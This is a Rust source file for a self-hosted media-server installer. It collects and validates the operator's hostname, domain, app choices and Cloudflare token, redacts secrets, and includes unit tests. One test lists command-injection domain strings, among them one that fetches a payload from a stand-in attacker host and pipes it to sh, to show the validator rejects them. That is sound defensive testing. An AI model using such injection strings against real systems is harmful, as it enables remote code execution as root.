//! Everything the operator tells the installer (spec R3 A1, R3 A8).
//!
//! Collected once, up front, before anything is generated or destroyed --
//! so that a run which is going to fail on a missing answer fails while it
//! still costs nothing.

use crate::prompt::PromptIo;
use crate::sso::{self, SsoDecision};

// Every app in ferrum's catalog. Must stay on ONE line: nix/modules/flake/
// checks.nix does a line lookup against it, the same way it does for
// forms.js's SUPPORTED_TYPES, because Nix's regex engine rejects the
// bracket-negation forms a multi-line parse would need. That check is what
// stops this list drifting from modules/lib/catalog.nix -- a drift whose
// symptom is an app the operator simply cannot install.
pub const CATALOG_APPS: &[&str] = &["jellyfin", "plex", "prowlarr", "qbittorrent", "radarr", "sabnzbd", "sonarr"];

/// Apps that need the Cloudflare DNS-01 credential once published.
///
/// Any public app does, so this is really "did they pick anything at all";
/// `modules/proxy/acme.nix` asserts `publicApps == {} || credentialProvided`.
pub fn needs_acme_credential(apps: &[String]) -> bool {
    !apps.is_empty()
}

/// A secret that cannot be printed by accident.
///
/// The Cloudflare token is the one genuinely high-value credential this
/// installer handles -- it grants DNS-zone-wide manipulation. Transport
/// discipline (stdin only, never argv, never persisted) was already
/// correct, but `#[derive(Debug)]` on the struct holding it meant a single
/// future `dbg!(&answers)` would leak it with no test to catch that.
#[derive(Clone, PartialEq, Eq)]
pub struct Secret(String);

impl Secret {
    pub fn new(value: String) -> Self {
        Self(value)
    }
    pub fn expose(&self) -> &str {
        &self.0
    }
}

impl std::fmt::Debug for Secret {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str("<redacted>")
    }
}

#[derive(Debug, PartialEq, Eq)]
pub struct Answers {
    pub hostname: String,
    pub base_domain: Option<String>,
    pub acme_email: Option<String>,
    pub sso: SsoDecision,
    pub apps: Vec<String>,
    /// The Cloudflare DNS-01 token, held in memory only. Never written to
    /// a file on the operator's machine and never logged; it reaches the
    /// host through `ferrum-apply put-secret` during stage 2.
    pub cloudflare_token: Option<Secret>,
}

/// A hostname must be a DNS label: it becomes `networking.hostName` and
/// the subdomain apps are published under.
fn validate_hostname(raw: &str) -> anyhow::Result<String> {
    let h = raw.trim().to_lowercase();
    if h.is_empty() || h.len() > 63 {
        anyhow::bail!("hostname must be 1-63 characters");
    }
    if !h.chars().all(|c| c.is_ascii_alphanumeric() || c == '-') {
        anyhow::bail!("hostname {h:?} may contain only letters, digits and '-'");
    }
    if h.starts_with('-') || h.ends_with('-') {
        anyhow::bail!("hostname {h:?} must not start or end with '-'");
    }
    Ok(h)
}

/// The ACME contact address. Same discipline as the SSO admin address.
///
/// # Errors
/// When the address is not usable.
fn validate_acme_email(raw: &str) -> anyhow::Result<String> {
    crate::sso::validate_email(raw)
}

/// Validates a base domain as an **allowlist**, not a typo-catcher.
///
/// This value is interpolated into commands that run as root on the target
/// (`verify::auth_checks`'s curl, among others). Rejecting whitespace and a
/// missing dot is not a safety property: backticks, `$`, `;`, `|`, `&` and
/// quotes all pass that. So only the characters a DNS name may actually
/// contain are permitted, and each label is checked.
///
/// # Errors
/// When the value is not a syntactically valid domain name.
fn validate_domain(raw: &str) -> anyhow::Result<String> {
    let d = raw.trim().to_lowercase();
    if d.is_empty() || d.len() > 253 {
        anyhow::bail!("{d:?} is not a domain name");
    }
    if !d.contains('.') || d.starts_with('.') || d.ends_with('.') {
        anyhow::bail!("{d:?} is not a domain name");
    }
    if !d.chars().all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-') {
        anyhow::bail!(
            "{d:?} contains characters that are not allowed in a domain name \
             (letters, digits, '.' and '-' only)"
        );
    }
    for label in d.split('.') {
        if label.is_empty() || label.len() > 63 {
            anyhow::bail!("{d:?} has a label that is empty or too long");
        }
        if label.starts_with('-') || label.ends_with('-') {
            anyhow::bail!("{d:?} has a label starting or ending with '-'");
        }
    }
    Ok(d)
}

/// Parses an app selection: names, or `all`, or empty for none.
///
/// # Errors
/// Names every unrecognised entry at once rather than one per retry.
pub fn parse_app_selection(raw: &str) -> anyhow::Result<Vec<String>> {
    let raw = raw.trim();
    if raw.is_empty() {
        return Ok(Vec::new());
    }
    if raw.eq_ignore_ascii_case("all") {
        return Ok(CATALOG_APPS.iter().map(|s| s.to_string()).collect());
    }
    let picked: Vec<String> = raw
        .split([',', ' '])
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .map(str::to_lowercase)
        .collect();
    let unknown: Vec<&str> = picked
        .iter()
        .map(String::as_str)
        .filter(|a| !CATALOG_APPS.contains(a))
        .collect();
    if !unknown.is_empty() {
        anyhow::bail!(
            "not in the catalog: {}. Available: {}",
            unknown.join(", "),
            CATALOG_APPS.join(", ")
        );
    }
    let mut sorted = picked;
    sorted.sort();
    sorted.dedup();
    Ok(sorted)
}

/// Asks a question until the answer validates, or gives up after three
/// tries so a scripted or confused session cannot loop forever.
fn ask_valid<T>(
    io: &mut impl PromptIo,
    question: &str,
    validate: impl Fn(&str) -> anyhow::Result<T>,
) -> anyhow::Result<T> {
    for attempt in 0..3 {
        let raw = io.ask(question)?;
        match validate(&raw) {
            Ok(v) => return Ok(v),
            Err(e) if attempt < 2 => io.say(&format!("  {e}")),
            Err(e) => return Err(e),
        }
    }
    unreachable!("the loop returns or errors on its last iteration")
}

/// Collects every operator answer.
///
/// # Errors
/// An input failure, an answer that fails validation three times, or a
/// declined SSO confirmation (see `sso::decide`).
pub fn collect(io: &mut impl PromptIo) -> anyhow::Result<Answers> {
    let hostname = ask_valid(io, "Hostname for this machine:", validate_hostname)?;

    io.say(
        "\nA base domain publishes each app at <app>.<domain> with a real \
         certificate.\nLeave it empty for a host reachable only from this \
         network.",
    );
    let raw_domain = io.ask("Base domain (empty for none):")?;
    let base_domain = if raw_domain.trim().is_empty() {
        None
    } else {
        Some(validate_domain(&raw_domain)?)
    };

    let acme_email = match &base_domain {
        Some(_) => Some(ask_valid(
            io,
            "Email for Let's Encrypt expiry notices:",
            validate_acme_email,
        )?),
        None => None,
    };

    io.say(&format!("\nCatalog apps: {}", CATALOG_APPS.join(", ")));
    let apps = ask_valid(
        io,
        "Apps to enable (comma separated, 'all', or empty for none):",
        parse_app_selection,
    )?;

    let sso = sso::decide(base_domain.as_deref(), &apps, io)?;

    // Asked last, and only when it is genuinely required, so an operator
    // exploring the questions is never prompted for a credential they do
    // not yet need.
    let cloudflare_token = if base_domain.is_some() && needs_acme_credential(&apps) {
        io.say(
            "\nLet's Encrypt issues these certificates over DNS-01, which needs a \
             Cloudflare API token\nscoped to Zone:Read + DNS:Edit on this domain. \
             It is held in memory, written to no file\nhere, and encrypted to the \
             host's own key once the host exists.",
        );
        let token = io.ask_secret("Cloudflare API token:")?;
        if token.is_empty() {
            anyhow::bail!(
                "a Cloudflare DNS-01 token is required to publish an app: \
                 modules/proxy/acme.nix refuses to build without it"
            );
        }
        Some(Secret::new(token))
    } else {
        None
    };

    Ok(Answers {
        hostname,
        base_domain,
        acme_email,
        sso,
        apps,
        cloudflare_token,
    })
}

/// Rebuilds the answers from a generated `settings.stage2.json`.
///
/// A resume after the disk has been erased must never re-prompt: the
/// operator answered these questions before anything was destroyed, and
/// asking again invites a different answer against a half-installed
/// machine. The one thing that cannot be recovered is the Cloudflare
/// token, which was deliberately never written anywhere -- the caller
/// re-asks for that alone, and only if it is still needed.
///
/// # Errors
/// Malformed JSON, or a document with no hostname to recover.
pub fn from_stage2(body: &str, hostname: &str) -> anyhow::Result<Answers> {
    let doc: serde_json::Value = serde_json::from_str(body)?;
    let sso_enabled = doc
        .pointer("/auth/enable")
        .and_then(serde_json::Value::as_bool)
        .unwrap_or(false);
    let mut apps: Vec<String> = doc
        .get("apps")
        .and_then(serde_json::Value::as_object)
        .map(|m| m.keys().cloned().collect())
        .unwrap_or_default();
    apps.sort();

    // EVERY field is re-validated, exactly as a fresh run validates it.
    //
    // This file lives in the operator's bind mount and the installer tells
    // them in as many words that the repository is theirs -- so between an
    // interrupted run and a resume it can legitimately have been edited by
    // hand, or by anything else with write access to that directory. A
    // resume that skipped validation would accept a domain a fresh run
    // would reject, and that value goes on to be interpolated into remote
    // commands. "Don't re-ask" must never become "don't re-check."
    let base_domain = match doc
        .pointer("/proxy/baseDomain")
        .and_then(serde_json::Value::as_str)
    {
        Some(d) => Some(validate_domain(d)?),
        None => None,
    };
    let acme_email = match doc
        .pointer("/proxy/acme/email")
        .and_then(serde_json::Value::as_str)
    {
        Some(e) => Some(validate_acme_email(e)?),
        None => None,
    };
    let admin_email = match doc
        .pointer("/auth/adminEmail")
        .and_then(serde_json::Value::as_str)
    {
        Some(e) => Some(crate::sso::validate_email(e)?),
        None => None,
    };
    if sso_enabled && admin_email.is_none() {
        anyhow::bail!(
            "the recovered settings enable authentication but name no admin \
             email; modules/proxy/authelia.nix asserts it is non-empty"
        );
    }
    let unknown: Vec<&str> = apps
        .iter()
        .map(String::as_str)
        .filter(|a| !CATALOG_APPS.contains(a))
        .collect();
    if !unknown.is_empty() {
        anyhow::bail!(
            "the recovered settings enable apps that are not in the catalog: {}",
            unknown.join(", ")
        );
    }
    let hostname = validate_hostname(hostname)?;

    Ok(Answers {
        hostname,
        base_domain,
        acme_email,
        sso: SsoDecision {
            enabled: sso_enabled,
            // Never recovered from disk: consent is a fact about what the
            // operator was shown and typed, not a property of a file that
            // anything with write access could add.
            unauthenticated_accepted_for: Vec::new(),
            admin_email,
        },
        apps,
        cloudflare_token: None,
    })
}

/// Whether a resumed run still needs the Cloudflare token.
///
/// It does only when the host publishes something and the encrypted file
/// is not already on the target from an earlier attempt.
pub fn token_still_needed(a: &Answers, already_on_host: bool) -> bool {
    a.base_domain.is_some() && needs_acme_credential(&a.apps) && !already_on_host
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::prompt::testing::Scripted;

    #[test]
    fn hostnames_must_be_dns_labels() {
        assert_eq!(validate_hostname(" Saltbox ").unwrap(), "saltbox");
        for bad in ["", "-a", "a-", "a b", "a_b", "a.b", &"x".repeat(64)] {
            assert!(validate_hostname(bad).is_err(), "accepted {bad:?}");
        }
    }

    #[test]
    fn domains_must_look_like_domains() {
        assert_eq!(validate_domain(" TheSyms.ca ").unwrap(), "thesyms.ca");
        for bad in [
            "localhost", ".a.com", "a.com.", "a b.com",
            // The shapes that matter: this value reaches a remote root shell.
            "example.com;curl$IFS-sattacker/p|sh",
            "a.com`id`", "a.com$(id)", "a.com|id", "a.com&id", "a.com'x'", "a.com\"x\"",
            "-a.com", "a-.com", "a..com",
        ] {
            assert!(validate_domain(bad).is_err(), "accepted {bad:?}");
        }
    }

    #[test]
    fn app_selection_accepts_names_all_and_nothing() {
        assert_eq!(parse_app_selection("").unwrap(), Vec::<String>::new());
        assert_eq!(parse_app_selection("ALL").unwrap().len(), CATALOG_APPS.len());
        assert_eq!(
            parse_app_selection("sonarr, radarr").unwrap(),
            vec!["radarr", "sonarr"]
        );
        assert_eq!(parse_app_selection("plex plex").unwrap(), vec!["plex"]);
    }

    #[test]
    fn an_unknown_app_names_itself_and_the_alternatives() {
        let err = parse_app_selection("sonarr, radar").unwrap_err().to_string();
        assert!(err.contains("radar"), "{err}");
        assert!(err.contains("radarr"), "the real name should be listed: {err}");
        assert!(!err.contains("sonarr,"), "should not implicate the valid one: {err}");
    }

    #[test]
    fn a_full_interactive_run_collects_everything() {
        let mut io = Scripted::new(&[
            "saltbox",
            "thesyms.ca",
            "me@thesyms.ca",
            "sonarr, plex",
            "",               // SSO: default yes
            "admin@thesyms.ca",
            "cf-token-value",
        ]);
        let a = collect(&mut io).unwrap();
        assert_eq!(a.hostname, "saltbox");
        assert_eq!(a.base_domain.as_deref(), Some("thesyms.ca"));
        assert_eq!(a.apps, vec!["plex", "sonarr"]);
        assert!(a.sso.enabled);
        assert_eq!(a.cloudflare_token.as_ref().map(Secret::expose), Some("cf-token-value"));
    }

    /// No domain means nothing is published, so neither ACME nor the token
    /// is asked for -- an operator exploring the questions is never
    /// prompted for a credential they do not need.
    #[test]
    fn no_domain_skips_acme_and_the_token() {
        let mut io = Scripted::new(&["saltbox", "", "plex"]);
        let a = collect(&mut io).unwrap();
        assert_eq!(a.base_domain, None);
        assert_eq!(a.acme_email, None);
        assert_eq!(a.cloudflare_token, None);
        assert!(!a.sso.enabled);
        let t = io.transcript();
        assert!(!t.contains("Cloudflare"), "should not have asked: {t}");
    }

    /// A domain with no apps publishes nothing, so acme.nix's assertion
    /// never fires and the token is not required.
    #[test]
    fn a_domain_with_no_apps_does_not_require_the_token() {
        let mut io = Scripted::new(&["saltbox", "thesyms.ca", "me@thesyms.ca", "", "", "a@b.co"]);
        let a = collect(&mut io).unwrap();
        assert!(a.apps.is_empty());
        assert_eq!(a.cloudflare_token, None);
    }

    #[test]
    fn an_empty_token_is_refused_with_the_reason() {
        let mut io = Scripted::new(&[
            "saltbox", "thesyms.ca", "me@thesyms.ca", "sonarr", "", "a@b.co", "",
        ]);
        let err = collect(&mut io).unwrap_err().to_string();
        assert!(err.contains("acme.nix"), "{err}");
    }

    /// The token must never be written anywhere on the operator's machine.
    /// Debug is the easiest accidental leak, so assert the shape we keep.
    #[test]
    fn the_token_is_only_ever_held_in_memory() {
        let mut io = Scripted::new(&[
            "saltbox", "thesyms.ca", "me@thesyms.ca", "sonarr", "", "a@b.co", "secret-token",
        ]);
        let a = collect(&mut io).unwrap();
        assert!(
            !io.transcript().contains("secret-token"),
            "the token must never be echoed back: {}",
            io.transcript()
        );
        assert_eq!(a.cloudflare_token.as_ref().map(Secret::expose), Some("secret-token"));
    }

    /// A resume must never re-prompt: the operator answered before
    /// anything was destroyed.
    #[test]
    fn answers_are_recovered_from_the_generated_stage_two_document() {
        let doc = serde_json::json!({
            "schemaVersion": 1,
            "proxy": { "enable": true, "baseDomain": "thesyms.ca", "acme": { "email": "me@thesyms.ca" } },
            "apps": { "sonarr": { "enable": true }, "plex": { "enable": true } },
            "auth": { "enable": true, "adminEmail": "admin@thesyms.ca" }
        });
        let a = from_stage2(&doc.to_string(), "saltbox").unwrap();
        assert_eq!(a.hostname, "saltbox");
        assert_eq!(a.base_domain.as_deref(), Some("thesyms.ca"));
        assert_eq!(a.apps, vec!["plex", "sonarr"]);
        assert!(a.sso.enabled);
        assert_eq!(a.sso.admin_email.as_deref(), Some("admin@thesyms.ca"));
    }

    /// The token was deliberately never written anywhere, so it cannot be
    /// recovered -- and must not be silently treated as absent-and-fine.
    #[test]
    fn the_token_is_never_recovered_from_disk() {
        let doc = serde_json::json!({ "apps": { "sonarr": { "enable": true } } });
        let a = from_stage2(&doc.to_string(), "h").unwrap();
        assert_eq!(a.cloudflare_token, None);
    }

    #[test]
    fn a_resume_re_asks_for_the_token_only_when_it_is_still_needed() {
        let doc = serde_json::json!({
            "proxy": { "enable": true, "baseDomain": "d.com" },
            "apps": { "sonarr": { "enable": true } }
        });
        let a = from_stage2(&doc.to_string(), "h").unwrap();
        assert!(token_still_needed(&a, false));
        assert!(!token_still_needed(&a, true), "already delivered");

        let no_apps = from_stage2(
            &serde_json::json!({ "proxy": { "baseDomain": "d.com" }, "apps": {} }).to_string(),
            "h",
        )
        .unwrap();
        assert!(!token_still_needed(&no_apps, false));
    }

    #[test]
    fn a_recovered_document_without_auth_reads_as_sso_off() {
        let a = from_stage2(&serde_json::json!({ "apps": {} }).to_string(), "h").unwrap();
        assert!(!a.sso.enabled);
    }

    /// One `dbg!(&answers)` away from a leak, before this.
    /// On screen, in scrollback, in a screen-share. Not worth it for the
    /// one credential here that grants DNS-zone-wide control.
    #[test]
    fn the_token_is_asked_for_without_echo() {
        let mut io = Scripted::new(&[
            "saltbox", "thesyms.ca", "me@thesyms.ca", "sonarr", "", "a@b.co", "tok",
        ]);
        collect(&mut io).unwrap();
        assert_eq!(io.secret_asks.len(), 1, "the token must use the non-echoing prompt");
        assert!(io.secret_asks[0].contains("Cloudflare"));
    }

    #[test]
    fn the_token_cannot_be_printed_by_debug() {
        let mut io = Scripted::new(&[
            "saltbox", "thesyms.ca", "me@thesyms.ca", "sonarr", "", "a@b.co", "super-secret",
        ]);
        let a = collect(&mut io).unwrap();
        let rendered = format!("{a:?}");
        assert!(!rendered.contains("super-secret"), "Debug leaked the token: {rendered}");
        assert!(rendered.contains("<redacted>"), "{rendered}");
        // ...and it is still retrievable where it is genuinely needed.
        assert_eq!(a.cloudflare_token.as_ref().map(Secret::expose), Some("super-secret"));
    }

    #[test]
    fn the_catalog_list_is_sorted_and_deduplicated() {
        let mut sorted = CATALOG_APPS.to_vec();
        sorted.sort();
        sorted.dedup();
        assert_eq!(CATALOG_APPS, sorted.as_slice(), "keep CATALOG_APPS sorted");
    }
}
